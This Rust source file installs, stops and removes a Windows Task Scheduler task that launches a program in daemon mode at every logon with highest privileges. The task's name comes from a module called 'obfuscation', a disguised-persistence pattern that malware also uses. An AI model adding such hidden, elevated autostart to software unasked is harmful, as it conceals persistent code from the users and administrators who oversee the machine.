use std::path::Path;

use anyhow::{Context, Result};

use crate::security::obfuscation;

fn run_schtasks(args: &[&str]) -> Result<String> {
    let output = std::process::Command::new("schtasks.exe")
        .args(args)
        .output()
        .context("cannot run schtasks.exe")?;

    if !output.status.success() {
        let stderr = String::from_utf8_lossy(&output.stderr);
        anyhow::bail!("schtasks failed: {}", stderr.trim());
    }

    Ok(String::from_utf8_lossy(&output.stdout).to_string())
}

pub fn install(exe_path: &Path) -> Result<()> {
    let name = obfuscation::service_name();
    let _ = run_schtasks(&["/delete", "/tn", name, "/f"]);

    let username = std::env::var("USERNAME").unwrap_or_default();
    // Fall back to SYSTEM only if USERNAME is somehow unavailable.
    let ru_arg: &str = if username.is_empty() {
        "SYSTEM"
    } else {
        &username
    };

    run_schtasks(&[
        "/create",
        "/tn",
        name,
        "/tr",
        &format!("\"{}\" --daemon", exe_path.display()),
        "/sc",
        "onlogon",
        "/ru",
        ru_arg,
        "/rl",
        "highest",
        "/f",
    ])?;

    log::info!("Task Scheduler task '{name}' created as user '{ru_arg}'");
    Ok(())
}

pub fn uninstall() -> Result<()> {
    let name = obfuscation::service_name();
    let _ = run_schtasks(&["/end", "/tn", name]);
    run_schtasks(&["/delete", "/tn", name, "/f"])?;
    log::info!("Task Scheduler task '{name}' deleted");
    Ok(())
}

pub fn stop() -> Result<()> {
    let name = obfuscation::service_name();
    run_schtasks(&["/end", "/tn", name])?;
    Ok(())
}
